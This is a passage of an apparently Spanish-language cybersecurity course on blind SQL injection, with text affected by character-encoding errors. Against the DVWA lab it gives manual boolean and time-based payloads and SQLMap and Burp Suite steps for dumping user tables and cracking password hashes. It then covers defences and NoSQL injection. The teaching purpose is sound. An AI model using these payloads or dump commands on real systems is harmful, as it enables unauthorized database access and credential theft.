A continuaci√≥n, demostraremos la 2‚Äô AND LENGTH(DATABASE())=X#condici√≥n " ", donde X es el n√∫mero de caracteres que se prueban. Esto se puede utilizar para determinar la longitud del nombre de la base de datos. Usaremos el mismo enfoque que acabamos de usar para determinar el n√∫mero de columnas, excepto que esta vez intentamos obtener el n√∫mero de caracteres en el nombre de la base de datos. Para hacer esto, probaremos por longitud de caracteres de manera iterativa.

![SQL 24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql24.png?raw=true)

> *Prueba para una longitud de car√°cter de 1.*

![SQL 25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql25.png?raw=true)

> *Finalmente, un cambio indica una longitud de nombre de base de datos de 4.*

Esto tambi√©n se puede realizar con un comando de suspensi√≥n en los casos en que no haya un indicador visual disponible. Por ejemplo, utilice " 2‚Äô AND LENGTH(DATABASE())=X AND SLEEP(5)#" donde X es la longitud sospechosa de la base de datos. Si el comando de suspensi√≥n retrasa la respuesta de la aplicaci√≥n, confirma la longitud correcta de la base de datos.

![SQL 26](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql26.png?raw=true)

**Paso 7: determinar el nombre de la base de datos**

Finalmente, podemos comenzar a enumerar el nombre real de la base de datos. Ya sabemos que tiene cuatro caracteres, pero podemos hacer m√°s determinando cu√°les son esos caracteres. Para hacer esto, probaremos diferentes caracteres ASCII usando 2‚Äô AND ASCII(SUBSTR(DATABASE(),X,X))>YY#. En este caso X, es la posici√≥n del car√°cter que estamos probando y YYes el **[car√°cter decimal ASCII](https://www.asciitable.com/)** .

Con este m√©todo, le pregunta a la base de datos si el primer car√°cter es mayor que una letra establecida. Si no es as√≠, responder√° con una negativa. Comenzaremos en alg√∫n lugar cerca de la mitad del alfabeto min√∫sculo con ‚Äúl‚Äù (que es el decimal ASCII 108). Entonces la consulta se ve as√≠: 2‚Äô AND ASCII(SUBSTR(DATABASE(),1,1))>108#.

![SQL 27](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql27.png?raw=true))

Seg√∫n la respuesta, sabemos que el primer car√°cter no es mayor que ‚Äúl‚Äù, por lo que tenemos que cambiar la operaci√≥n para preguntar si es menor que ‚Äúl‚Äù. Hacemos esto cambiando la consulta a 2‚Äô AND ASCII(SUBSTR(DATABASE(),1,1))<108#.

![SQL 28](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql28.png?raw=true)

![SQL 29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql29.png?raw=true)

Seg√∫n esta respuesta, ahora sabemos que la primera letra est√° en alg√∫n lugar entre la ‚Äúl‚Äù min√∫scula y todos los caracteres ASCII anteriores. T√©cnicamente, esto incluye todas las may√∫sculas, n√∫meros y caracteres especiales. Sabiendo esto podemos empezar a probar de forma incremental hasta que veamos un cambio en la respuesta. En nuestro caso, vemos una respuesta modificada una vez que ingresamos 100.

![SQL 30](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql30.png?raw=true)

![SQL 31](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql31.png?raw=true)

Esto ahora nos dice que el car√°cter no es menor que una ‚Äúd‚Äù min√∫scula. Podemos confirmar que esta es la letra correcta invirtiendo la consulta.

![SQL 32](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql32.png?raw=true)

![SQL 33](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql33.png?raw=true)

Hemos confirmado con √©xito el primer personaje. Ahora, podemos usar este mismo m√©todo cambiando la consulta a la ubicaci√≥n del segundo car√°cter y repitiendo esto nuevamente. Nos aseguraremos de cambiar la ubicaci√≥n ingresando 2‚Äô AND ASCII(SUBSTR(DATABASE(),2,2))<108#.

![SQL 34](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql34.png?raw=true)

![SQL 35](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql35.png?raw=true)

![SQL 36](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql36.png?raw=true)

> *Con este resultado, sabemos que el segundo car√°cter es mayor que la ‚Äúl‚Äù min√∫scula.*

A estas alturas, deber√≠a comprender el fundamento de cada paso. Al observar el comportamiento de la aplicaci√≥n en respuesta a varios comandos SQL inyectados, puede identificar y comprender eficazmente las vulnerabilidades de inyecci√≥n SQL ciega.

En la siguiente secci√≥n, demostraremos c√≥mo explotar estas vulnerabilidades con la ayuda de SQLMap. Contin√∫e practicando estas t√©cnicas en un entorno controlado para perfeccionar sus habilidades y convertirse en un experto en la detecci√≥n y explotaci√≥n de ataques de inyecci√≥n SQL ciega.

### **Ejemplo 1: Explotaci√≥n de la inyecci√≥n SQL ciega**

Ahora que hemos confirmado la vulnerabilidad, seguiremos los pasos para explotarla usando SQLMap. Preste atenci√≥n a las capturas de pantalla de cada paso para una mejor comprensi√≥n. A√∫n mejor, sigue las instrucciones para consolidar realmente el proceso y el aprendizaje en tu mente y desarrollar esta habilidad.

**Paso 1: familiarizarse con SQLMap**

Abra la p√°gina de ayuda de SQLMap para familiarizarse con el tipo de informaci√≥n necesaria para un ataque y la estructura de comando de la herramienta. En concreto veremos que podemos utilizar una URL con la -ubandera y la informaci√≥n de la cookie con la bandera `--cookie=COOKIE.`

`sqlmap -h`

![SQL 37](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql37.png?raw=true)

**Paso 2: recuperar informaci√≥n de la sesi√≥n**

Recopile las cookies requeridas y el nivel de seguridad del Panel de desarrollador del navegador en la pesta√±a Almacenamiento.

![SQL 38](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql38.png?raw=true)

**Paso 3: comando URL de SQLMap**

Ejecute SQLMap con la informaci√≥n -uy --cookie=. Revise la informaci√≥n resultante, que incluye los par√°metros, la carga √∫til y la ubicaci√≥n de los archivos de salida.

![SQL 39](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql39.png?raw=true)

> *SQLMap ejecutando ataque URL.*

![SQL 40](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql40.png?raw=true)

> *Devoluci√≥n de par√°metros y ubicaci√≥n de salida.*

**Paso 4: abrir el archivo de sesi√≥n**

Ahora iremos a la terminal y navegaremos hasta la ubicaci√≥n del archivo de salida. Primero, lo usaremos para ver con qu√© archivos tenemos para trabajar. Util√≠celo sqlitebrowserpara abrir el session.sqlitearchivo.

![SQL 41](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql41.png?raw=true)

**Paso 5: Navegador de base de datos**

En el navegador sqlite, examine la estructura de la base de datos y explore las pesta√±as de datos.

![SQL 42](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql42.png?raw=true)

> *Visualizaci√≥n de la pesta√±a "Estructura de la base de datos" en DB Browser.*

![SQL 43](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql43.png?raw=true)

> *Visualizaci√≥n de la pesta√±a "Buscar datos" en DB Browser.*

**Paso 6: ver el archivo de destino**

Regrese a la terminal y use cat target.txtpara ver el archivo que contiene el comando que us√≥.

![SQL 44](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql44.png?raw=true)

**Paso 7: Ver registro**

√öselo cat log para ver el contenido del registro. Esto incluye la misma informaci√≥n de par√°metros y carga √∫til que vimos anteriormente, as√≠ como detalles sobre la base de datos y la tecnolog√≠a de la aplicaci√≥n web. Toda esta informaci√≥n podr√≠a ser √∫til en cualquier seguimiento de las pruebas de penetraci√≥n que podamos realizar en etapas posteriores.

![SQL 45](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql45.png?raw=true)

**Paso 8: URL de SQLMap con indicador de nombre de base de datos**

Ahora regresaremos a la terminal y ejecutaremos el mismo comando en SQLMap, pero esta vez agregaremos '--dbs' para descubrir el nombre de la base de datos. Sabemos que tiene cuatro caracteres debido a nuestra prueba manual anterior, pero queremos saber m√°s sobre esta base de datos.

![SQL 46](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql46.png?raw=true)

> *¬°Y ah√≠ est√°, ‚Äúdvwa‚Äù!*

**Paso 9: URL de SQLMap con indicador de columna**

A continuaci√≥n, queremos obtener las columnas de usuario con las banderas -D dvwa -T users --columns. Esto le proporcionar√° mucha m√°s informaci√≥n sobre lo que realmente hay dentro de la base de datos.

![SQL 47](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql47.png?raw=true)

![SQL 48](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql48.png?raw=true)

**Paso 10: URL de SQLMap con indicador de volcado de usuario**

Ahora llegamos a la parte buena, util√≠cela -T users --dumppara extraer datos de la tabla del usuario. Revise la respuesta y observe c√≥mo SQLMap le solicita que descifre el hash de las contrase√±as que descubre y luego le presenta los resultados en una tabla clara y ordenada.

![SQL 49](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql49.png?raw=true)

![SQL 50](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql50.png?raw=true)

> *Aqu√≠ revisa la base de datos y extrae informaci√≥n del usuario.*

![SQL 51](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql51.png?raw=true)

> *SQLMap ofrece descifrar los hashes de contrase√±as. ¬°S√≠, por favor!*

![SQL 52](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql52.png?raw=true)

Observe la ordenada disposici√≥n de la informaci√≥n en la imagen de arriba. Adem√°s de simplemente descifrar las contrase√±as y colocarlas en una tabla ordenada, SQLMap tambi√©n genera autom√°ticamente esa informaci√≥n en un archivo .csv. Luego, esto se puede incorporar a otras herramientas para realizar m√°s exploits durante un caso de prueba de penetraci√≥n.

### **Ejemplo 2: Explotaci√≥n de la inyecci√≥n SQL ciega con datos HTTP**

Ahora demostraremos un m√©todo alternativo para explotar la inyecci√≥n SQL ciega utilizando SQLMap y **la recopilaci√≥n de datos HTTP de Burp Suite** .

**Paso 1: Intercepta el tr√°fico con Burp Suite**

Abra Burp Suite, que ha configurado para capturar el tr√°fico HTTP. Luego navegue hasta la pesta√±a Proxy y localice el env√≠o de la consulta en el historial HTTP.

![SQL 53](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql53.png?raw=true)

**Paso 2: enviar solicitud al repetidor**

En el panel Solicitud, haga clic derecho en el env√≠o de la consulta y seleccione 'Enviar al repetidor'.

**Paso 3: copie los datos sin procesar de Burp Suite**

Cambie a la pesta√±a Repetidor y copie los datos de la solicitud sin procesar del panel.

![SQL 54](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql54.png?raw=true)

**Paso 4: crear archivo de solicitud**

Pegue los datos de la solicitud sin procesar en un archivo nuevo que usar√° con SQLMap. En nuestro ejemplo, llamamos a este archivo request.

![SQL 55](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql55.png?raw=true)

**Paso 5: SQLMap carga el archivo de solicitud HTTP**

Regrese a la terminal y ejecute el comando sqlmap -r request. El -rindicador le indica a SQLMap que analice y utilice la solicitud HTTP sin formato del archivo especificado.

![SQL 56](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql56.png?raw=true)

Como en el m√©todo anterior, SQLMap ofrecer√° descifrar los hash de contrase√±a del usuario descubierto una vez que haya extra√≠do los datos.

![SQL 57](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql57.png?raw=true)

<aside>
üëâ Este m√©todo proporciona una alternativa a la introducci√≥n manual de informaci√≥n de cookies y URL en la l√≠nea de comando, lo que agiliza el proceso utilizando el tr√°fico HTTP capturado. Como en los m√©todos anteriores, esta informaci√≥n se env√≠a a su directorio y puede estudiarse o utilizarse para esfuerzos futuros.

</aside>

## **Defensa contra la inyecci√≥n SQL ciega**

Si sigue las mejores pr√°cticas y pautas recomendadas por organizaciones acreditadas como **OWASP** , NIST, W3 y Amazon AWS, puede fortalecer significativamente las defensas de su aplicaci√≥n contra estos ataques.

Estas organizaciones proporcionan informaci√≥n y recursos valiosos que cubren una amplia gama de temas, incluidas pr√°cticas de codificaci√≥n segura, seguridad de bases de datos, defensas de aplicaciones web y monitoreo y respuesta a incidentes. En esta secci√≥n, exploraremos estas mejores pr√°cticas en detalle y le brindaremos pasos pr√°cticos para ayudar a proteger su aplicaci√≥n web contra vulnerabilidades de inyecci√≥n SQL ciega.

### **Pr√°cticas de codificaci√≥n segura**

La implementaci√≥n de pr√°cticas de codificaci√≥n segura es crucial para defenderse contra ataques de inyecci√≥n SQL ciega. **[OWASP recomienda utilizar declaraciones preparadas](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)** o consultas parametrizadas para separar la entrada del usuario del c√≥digo SQL, lo que reduce el riesgo de inyecci√≥n. Adem√°s, la incorporaci√≥n de t√©cnicas de validaci√≥n de entradas, como las listas blancas, ayuda a **restringir los tipos de datos que pueden introducir** los usuarios, lo que mejora a√∫n m√°s la seguridad.

### **Seguridad de la base de datos**

Las medidas de seguridad de la base de datos son esenciales para minimizar el impacto potencial de un ataque. Limitar los privilegios de los usuarios de la base de datos garantiza que los atacantes no puedan obtener acceso a informaci√≥n confidencial ni realizar acciones no autorizadas. Actualizar y parchear peri√≥dicamente su sistema de administraci√≥n de bases de datos ayuda a abordar las vulnerabilidades conocidas, lo que dificulta que los atacantes las exploten. Puede leer m√°s sobre esto en **[NIST SP 800-44 versi√≥n 2](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)** (la Secci√≥n 6.4.2 analiza esto espec√≠ficamente).

### **Defensas de aplicaciones web**

La implementaci√≥n de defensas de aplicaciones web, como un firewall de aplicaciones web (WAF), puede ayudar a detectar y bloquear los intentos de inyecci√≥n de SQL. **[Amazon AWS analiza](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-use-case.html)** c√≥mo un WAF analiza el tr√°fico entrante y filtra solicitudes maliciosas a trav√©s de grupos de reglas administrados por bases de datos, lo que reduce la probabilidad de un ataque exitoso.

### **Seguimiento y respuesta a incidentes**

Monitorear y registrar la actividad de las aplicaciones es vital para identificar actividades sospechosas y detectar posibles ataques desde el principio. **[NIST recomienda](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)** establecer un sistema s√≥lido de registro y monitoreo, junto con un plan de respuesta a incidentes bien definido, que garantice respuestas r√°pidas y efectivas a los incidentes de seguridad.

## **Conclusi√≥n**

A lo largo de este art√≠culo, hemos profundizado en la inyecci√≥n SQL ciega, explorando sus caracter√≠sticas √∫nicas y las t√©cnicas utilizadas para descubrir y explotar estas vulnerabilidades. Desde configurar un entorno de prueba con DVWA y Kali Linux hasta realizar pruebas manuales y utilizar herramientas como SQLMap y Burp Suite, le proporcionamos orientaci√≥n pr√°ctica y consejos pr√°cticos para adquirir habilidades en este tema complejo.

Adem√°s, hemos enfatizado la importancia de implementar medidas de seguridad s√≥lidas, como pr√°cticas de codificaci√≥n segura, seguridad de bases de datos, defensas de aplicaciones web y monitoreo y respuesta a incidentes para protegerse contra ataques de inyecci√≥n SQL ciega.

Como hemos demostrado, la inyecci√≥n ciega de SQL es un desaf√≠o formidable en la seguridad cibern√©tica para aplicaciones web, pero con el conocimiento y las habilidades adecuados, puede defenderse eficazmente contra estas amenazas. Contin√∫e su aprendizaje tomando estos cursos para reforzar su aptitud en defensa y pirater√≠a √©tica de aplicaciones web:

## **Preguntas frecuentes**

- **¬øCu√°les son los tipos de inyecci√≥n SQL ciega?**

Hay dos tipos principales de inyecci√≥n SQL ciega:

**Inyecci√≥n SQL ciega basada en booleanos** : en este tipo, los atacantes infieren informaci√≥n de las respuestas de la aplicaci√≥n web, como cambios en el contenido, mensajes de error o c√≥digos de estado HTTP, aunque el resultado de la consulta real no es directamente visible.

**Inyecci√≥n SQL ciega basada en el tiempo** : en este tipo, los atacantes introducen retrasos en sus consultas SQL utilizando funciones sensibles al tiempo (por ejemplo, SLEEP o WAITFOR DELAY) y observan el tiempo de respuesta de la aplicaci√≥n web para inferir informaci√≥n sobre la base de datos. Los diferentes tiempos de respuesta indican si la condici√≥n inyectada era verdadera o falsa.

- **¬øQu√© es la respuesta condicional de inyecci√≥n SQL ciega?**

Una respuesta condicional de inyecci√≥n SQL ciega, tambi√©n conocida como inyecci√≥n SQL ciega basada en contenido o booleana, es una t√©cnica utilizada por los atacantes para extraer informaci√≥n de una aplicaci√≥n web vulnerable sin ver directamente el resultado de sus consultas SQL inyectadas.

En cambio, los atacantes inyectan declaraciones SQL con condiciones verdaderas o falsas y observan cambios en el comportamiento o contenido de la aplicaci√≥n web en funci√≥n de la veracidad de estas condiciones. Al analizar estas respuestas, el atacante puede inferir indirectamente la informaci√≥n que busca en la base de datos.

Piense en esto como un juego malicioso de 20 preguntas.

- **¬øQu√© herramientas se pueden utilizar para explotar la inyecci√≥n SQL ciega?**

Existen varias herramientas que se pueden utilizar para explotar las vulnerabilidades de inyecci√≥n SQL ciega. Algunas de las herramientas m√°s populares y efectivas incluyen:

1. SQLMap: SQLMap, una herramienta de c√≥digo abierto poderosa y ampliamente utilizada, automatiza la detecci√≥n y explotaci√≥n de vulnerabilidades de inyecci√≥n SQL.

2. Burp Suite: Esta es una plataforma integral de prueba de seguridad de aplicaciones web, que incluye una gama de herramientas para detectar y explotar vulnerabilidades de inyecci√≥n SQL ciega, como los m√≥dulos Repetidor e Intruso.

3. Pruebas manuales: si bien las herramientas automatizadas pueden resultar muy √∫tiles, las pruebas manuales siguen desempe√±ando un papel esencial en la detecci√≥n y explotaci√≥n de vulnerabilidades de inyecci√≥n SQL ciega.

- **¬øCu√°les son las se√±ales de que un sitio web es vulnerable a la inyecci√≥n SQL ciega?**

Si bien ning√∫n indicador garantiza la presencia de una vulnerabilidad, los siguientes signos pueden sugerir que una aplicaci√≥n web podr√≠a ser susceptible a una inyecci√≥n SQL ciega:

1. Comportamiento inesperado: si la aplicaci√≥n muestra un comportamiento inusual cuando ciertos caracteres (como comillas simples o dobles) se ingresan en los campos de entrada del usuario, puede indicar que la aplicaci√≥n no est√° manejando o desinfectando adecuadamente la entrada del usuario.

2. Respuestas condicionales: al inyectar consultas SQL que deber√≠an devolver verdadero o falso, si la aplicaci√≥n muestra un comportamiento diferente seg√∫n la veracidad de la condici√≥n inyectada, puede sugerir una vulnerabilidad de inyecci√≥n SQL ciega.

3. Retrasos de tiempo: la aplicaci√≥n experimenta retrasos notables en el tiempo de respuesta cuando se inyectan consultas SQL espec√≠ficas (por ejemplo, al usar la SLEEP()funci√≥n).

4. Mensajes de error: si bien es posible que los mensajes de error no sean directamente visibles en los ataques de inyecci√≥n SQL ciega, se debe evaluar cualquier mensaje de error o respuesta inusual de la aplicaci√≥n.

- **¬øCu√°les son las mejores pr√°cticas para prevenir la inyecci√≥n SQL ciega?**

Las mejores pr√°cticas para prevenir la inyecci√≥n ciega de SQL implican una combinaci√≥n de pr√°cticas de codificaci√≥n segura, medidas de seguridad de bases de datos, defensas de aplicaciones web y estrategias de monitoreo y respuesta a incidentes.

**Advanced SQL Injection**

La inyecci√≥n SQL avanzada es una t√©cnica m√°s sofisticada que la inyecci√≥n SQL b√°sica, que utiliza t√©cnicas m√°s complejas para explotar vulnerabilidades en las aplicaciones web. Esto puede incluir la manipulaci√≥n de los datos de entrada de la aplicaci√≥n, la identificaci√≥n de patrones de filtrado, la explotaci√≥n de errores en la aplicaci√≥n y la utilizaci√≥n de herramientas automatizadas para la inyecci√≥n de c√≥digo malicioso. Este ataque puede tener consecuencias graves, como la exposici√≥n de informaci√≥n confidencial, el robo de datos, la alteraci√≥n de la informaci√≥n almacenada en la base de datos y la p√©rdida de datos importantes. Por lo tanto, es importante que las empresas y desarrolladores de aplicaciones web implementen medidas de seguridad adecuadas para evitar este tipo de ataques.

![SQL 58](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql58.png?raw=true)

## Consecuencias

Las consecuencias de una inyecci√≥n SQL Avanzadas pueden incluir:

- **P√©rdida o alteraci√≥n de datos:** el atacante puede eliminar, modificar o extraer informaci√≥n de la base de datos.
- **Inestabilidad del sistema:** el c√≥digo malicioso puede causar que la base de datos deje de funcionar correctamente, lo que puede resultar en tiempos de inactividad y p√©rdida de disponibilidad.
- **Dificultad para detectar y mitigar el ataque:** debido a que el c√≥digo malicioso se inserta en una consulta SQL leg√≠tima.
- **Posibilidad de propagaci√≥n del ataque:** si el atacante tiene acceso a datos sensibles, como contrase√±as de usuario, puede utilizarlos para propagar el ataque a otros sistemas.
- **Acceso no autorizado:** un atacante podr√≠a obtener acceso no autorizado al sistema o a la aplicaci√≥n web, lo que le permitir√≠a acceder a informaci√≥n confidencial o realizar acciones maliciosas en el sistema.
- **Modificaci√≥n de datos:** un atacante podr√≠a modificar, eliminar o agregar datos al sistema, lo que podr√≠a tener graves consecuencias en la integridad y exactitud de los datos.
- **Ejecuci√≥n de c√≥digo malicioso:** un atacante podr√≠a ejecutar c√≥digo malicioso en el sistema, lo que podr√≠a resultar en la toma de control del sistema o en el robo de informaci√≥n confidencial.
- **Denegaci√≥n de servicio:** un atacante podr√≠a utilizar la inyecci√≥n de comando para sobrecargar el sistema y hacer que se vuelva inoperable.

**La no correcci√≥n de esta falla puede causar divulgaci√≥n no autorizada de su informaci√≥n y la de sus clientes que podr√≠a dar lugar a fraude, usurpaci√≥n de identidad y a sanciones reglamentarias.** Para evitar la inyecci√≥n de comandos, es importante validar y filtrar todas las entradas de usuario en las aplicaciones web, y evitar el uso de comandos de shell en aplicaciones web.¬† Adem√°s, es importante mantener todas las aplicaciones y sistemas actualizados y parcheados para evitar que se exploten vulnerabilidades conocidas.

## Soluci√≥n

Para prevenir y solucionar la inyecci√≥n SQL avanzada, se pueden tomar las siguientes medidas:

- **Validar y sanitizar todas las entradas de datos**: Aseg√∫rese de que todas las entradas de datos, ya sean proporcionadas por los usuarios o por otras fuentes, sean validadas y sanitizadas adecuadamente antes de ser utilizadas en una consulta SQL.
- **Utilizar consultas parametrizadas:** En lugar de construir una consulta SQL din√°micamente utilizando cadenas de texto, utilice consultas parametrizadas que permitan que los par√°metros sean pasados como argumentos separados. Esto reducir√° la posibilidad de inyecci√≥n SQL, ya que los valores de los par√°metros son tratados como datos, no como parte de la consulta SQL.
- **Limitar los permisos de la base de datos:** Aseg√∫rese de que los usuarios de la base de datos tengan solo los permisos necesarios para realizar sus funciones y nada m√°s. Esto limitar√° el alcance de cualquier posible ataque.
- **Utilizar herramientas de seguridad y pruebas de penetraci√≥n:** Realice pruebas regulares de seguridad y pruebas de penetraci√≥n en la aplicaci√≥n para identificar posibles vulnerabilidades y errores de seguridad. Tambi√©n puede utilizar herramientas de seguridad de terceros para proteger la aplicaci√≥n contra la inyecci√≥n SQL.
- **Actualizaci√≥n y parcheo del software de la base de datos y uso de firewalls de aplicaci√≥n web (WAF)**

Es una tarea dif√≠cil determinar si una cadena de usuario es maliciosa o no. Por lo tanto, la mejor manera de hacerlo es ‚Äúescapar‚Äù de los caracteres especiales en la entrada del usuario. Puede escapar una cadena antes de construir la consulta en PHP usando la funci√≥n `mysql_escape_string()`. O en MySQL usando la funci√≥n `mysqli_real_escape_string()`.

Mientras se muestra la salida como HTML, tambi√©n tendr√° que convertir la cadena para asegurarse de que los caracteres especiales no interfieren con el marcado HTML. Puede convertir caracteres especiales en PHP usando la funci√≥n htmlspecialchars().

<aside>
üëâ Alternativamente, puede usar sentencias preparadas para evitar las inyecciones de SQL. Una sentencia preparada es una plantilla de una consulta SQL, en la que se especifican los par√°metros en una etapa posterior para ejecutarla. Aqu√≠ hay un ejemplo de una declaraci√≥n preparada en PHP y MySQLi.

</aside>

`$query = $mysql_connection->prepare("select * from user_table where username = ? and password = ?");`

`$query->execute(array($username, $password));`

<aside>
üìñ En resumen, para solucionar y prevenir la inyecci√≥n SQL avanzada, es necesario validar y sanitizar todas las entradas de datos, utilizar consultas parametrizadas, limitar los permisos de la base de datos y utilizar herramientas de seguridad y pruebas de penetraci√≥n.

</aside>

## Referencias

- [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [https://kinsta.com/es/blog/inyeccion-sql/](https://kinsta.com/es/blog/inyeccion-sql/)
- [https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)
- [https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/](https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/)

# Inyecci√≥n NoSQL - MongoDB

La Inyecci√≥n NoSQL (NoSQL Injection) es una vulnerabilidad que ocurre cuando se ingresan datos no validados o maliciosos en una consulta NoSQL, lo que permite a un atacante manipular la consulta para obtener informaci√≥n confidencial, borrar datos o ejecutar c√≥digo malicioso en el servidor.

Las consecuencias de una Inyecci√≥n NoSQL pueden ser graves y variadas, dependiendo del tipo de datos que se almacenen en la base de datos y de la capacidad de los atacantes para explotar la vulnerabilidad.

![NoSQL1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL1.png?raw=true)

Al igual que cualquier ataque de inyecci√≥n, consiste en utilizar un vector de ataque que al ejecutarse en la aplicaci√≥n nos permita alterar el funcionamiento de la misma para obtener informaci√≥n, modificarla o saltearnos el proceso de login. Aunque no usar el lenguaje SQL puede hacer m√°s dif√≠cil la ejecuci√≥n de una inyecci√≥n de c√≥digo, no es defensa suficiente en contra de estos ataques.

Es cierto que, entonces, ya no funcionar√≠an herramientas como SQLMap, que sirven para automatizar y facilitar los ataques de inyecci√≥n SQL. No obstante, tambi√©n hay exploits para otros tipos de lenguajes comunes como, por ejemplo, MongoDB.

Sencillamente, el atacante necesitar√° otra sintaxis si desea hacer una inyecci√≥n de c√≥digo en una base de datos diferente. Sin embargo, la configuraci√≥n de tal p√°gina debe hacerse rigurosamente si desea evitarse un peligroso ataque de inyecci√≥n NoSQL, que podr√≠a llevar a las mismas consecuencias de uno con SQL. Es decir, desde el robo de datos hasta el control total de la m√°quina.

## Consecuencias

Algunas de las posibles consecuencias de una Inyecci√≥n NoSQL son:

- **Fuga de datos confidenciales**: Si los atacantes pueden manipular la consulta para obtener informaci√≥n confidencial, pueden acceder a datos como contrase√±as, nombres de usuarios, direcciones de correo electr√≥nico, n√∫meros de tarjetas de cr√©dito y otros datos sensibles.
- **Modificaci√≥n o eliminaci√≥n de datos:** Si los atacantes pueden manipular la consulta para modificar o eliminar datos, pueden causar da√±os significativos al sistema y a los datos almacenados.
- **Denegaci√≥n de servicio (DoS):** Si los atacantes pueden manipular la consulta para ejecutar c√≥digo malicioso en el servidor, pueden causar una sobrecarga del sistema o una denegaci√≥n de servicio (DoS) que puede dejar fuera de l√≠nea el sitio web o la aplicaci√≥n.
- **Vulnerabilidad en cadena:** Una Inyecci√≥n NoSQL tambi√©n puede ser el punto de entrada para una cadena de vulnerabilidades, lo que permite a los atacantes aprovechar otras vulnerabilidades en la aplicaci√≥n o en el sistema para obtener m√°s acceso y control.

<aside>
üìñ En resumen, una Inyecci√≥n NoSQL puede tener consecuencias graves para la seguridad y privacidad de los datos almacenados en una base de datos NoSQL, lo que puede afectar la reputaci√≥n de la empresa, la confianza de los usuarios y la estabilidad del sistema. Es importante tomar medidas de seguridad para prevenir la Inyecci√≥n NoSQL, como la validaci√≥n de datos, el uso de par√°metros en las consultas y la implementaci√≥n de cortafuegos.

</aside>

## Soluci√≥n

Para evitar la inyecci√≥n NoSQL, es importante implementar las siguientes medidas de seguridad:

- **Validaci√≥n de entrada de datos:** Todos los datos ingresados por los usuarios deben ser validados y filtrados para asegurarse de que no contienen caracteres maliciosos que puedan ser explotados en un ataque.
- **Limitaci√≥n de permisos:** La base de datos debe ser configurada para limitar los permisos de los usuarios y solo permitir el acceso a las funciones y datos necesarios para realizar sus tareas.
- **Encriptaci√≥n:** Los datos sensibles almacenados en la base de datos deben ser encriptados para protegerlos de accesos no autorizados.
- **Auditor√≠a de seguridad:** Debe haber un sistema de registro de eventos y seguimiento de auditor√≠a en lugar para detectar cualquier actividad sospechosa en la base de datos.
- **Actualizaciones de seguridad:** Mantener la base de datos actualizada con las √∫ltimas actualizaciones de seguridad y parches de software puede reducir la exposici√≥n a vulnerabilidades conocidas.

<aside>
üí° Adem√°s, es importante educar a los desarrolladores y usuarios sobre las buenas pr√°cticas de seguridad y asegurarse de que todos los procedimientos de seguridad est√©n documentados y sean f√°cilmente accesibles para el equipo de desarrollo.

</aside>

## **Referencias**

- [https://arxiv.org/pdf/1506.04082.pdf](https://arxiv.org/pdf/1506.04082.pdf)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html)
- [A03 Injection - OWASP Top 10:2021](https://owasp.org/Top10/A03_2021-Injection/)
